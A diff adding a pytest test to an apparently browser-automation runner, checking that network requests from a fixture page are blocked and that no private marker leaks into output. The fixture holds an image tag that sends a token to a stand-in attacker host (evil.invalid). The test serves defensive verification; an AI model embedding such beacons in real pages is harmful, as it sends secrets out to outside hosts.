@@ -226,3 +226,20 @@ def test_measure_layout_numeric_only_no_document_text(monkeypatch, tmp_path):
     assert metrics["image_total"] == 1
     assert out["network_denied"] >= 1
     assert "PRIVATE_FIXTURE_MARKER_NOT_TO_COPY" not in json.dumps(out)
+
+
+def test_real_browser_denial_reason_is_code_only(monkeypatch, tmp_path):
+    import hba.runner as runner
+    malicious = tmp_path / "requests.html"
+    malicious.write_text(
+        '<main><h1>Safe</h1>'
+        '<img src="https://evil.invalid/sensitive?token=VERY_PRIVATE_FIXTURE_MARKER">'
+        '</main>', encoding="utf-8")
+    monkeypatch.setattr(runner, "SAMPLE_HTML", malicious)
+    out = run_manifest(fixture([action("assert_role", role="heading", name="Safe")]),
+                       runs_dir=tmp_path, chromium_executable=CHROMIUM)
+    assert out["state"] == "SYNTHETIC_TEST_PASS"
+    assert out["network_denial_codes"]["FIXTURE_NETWORK_DISABLED"] >= 1
+    assert sum(out["network_denial_codes"].values()) == out["network_denied"]
+    assert "VERY_PRIVATE_FIXTURE_MARKER" not in json.dumps(out)
+    assert "token" not in json.dumps(out)
